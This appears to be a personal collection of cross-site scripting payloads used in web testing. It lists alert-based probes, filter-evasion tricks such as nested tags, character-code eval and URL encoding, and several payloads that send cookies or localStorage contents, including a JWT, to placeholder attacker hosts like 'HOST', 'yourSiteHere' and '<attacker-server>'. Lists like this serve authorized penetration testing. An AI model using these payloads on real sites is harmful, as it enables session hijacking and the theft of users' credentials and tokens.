## This will be a collection of XSS JavaScript Payloads I have used



"><h1>test</h1>
'+alert(1)+'
"onmouserover="alert(1)
http://"onmouseover="alert(1)
<body onload=alert(1)>



<img src=x onerror=alert(1) />
<img src=x onerror='alert(1)' />



<object data=javascript:alert(1)>
<x onmouseover=alert(1)>


<a onmouseover='alert(1)'>


<svg onload=alert(1)>

<svg onload=fetch('//HOST/?cookie='+document.cookie)>

<svg onload="document.body.innerHTML='<img src=//HOST/IMAGE>'">



“><script>alert(1)</script>
<script>alert(document.domain)</script>
<sc<script>ript>alert(1)</sc</script>ript>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>

<script>eval("al"+"ert(1)")</script>
<script>eval("al"%2b"ert(1)")</script>
</script>;<script>alert(1)</script>
</script><script>alert(1)</script>


%3Cscript%3Edocument.write(%27%3Cimg%20src=%22http://yourSiteHere?c=%27%2bdocument.cookie%2b%27%22%20/%3E%27);%3C/script%3E
The above code looks like the below code before encoding
<script>document.write('<img src="yourSiteHere?c='%2bdocument.cookie%2b'" />');</script>

<hr>

 A typical way of rendering a standard cookie (without protections) in a JavaScript alert box is:
<script>alert(document.cookie)</script>

As data in localStorage is stored within an array
<script>alert(localStorage.getItem(‘key’))</script>
Example:
<script>alert(localStorage.getItem(‘ServiceProvider.kdciaasdkfaeanfaegfpe23.username@company.com.accessToken’))</script>
or This will convert all of the localStorage contents into a string and overcome this array barrier
<script>alert(JSON.stringify(localStorage))</script>

A complete XSS PoC to steal a JWT would look like this:
<img src=’https://<attacker-server>/yikes?jwt=’+JSON.stringify(localStorage);’--!>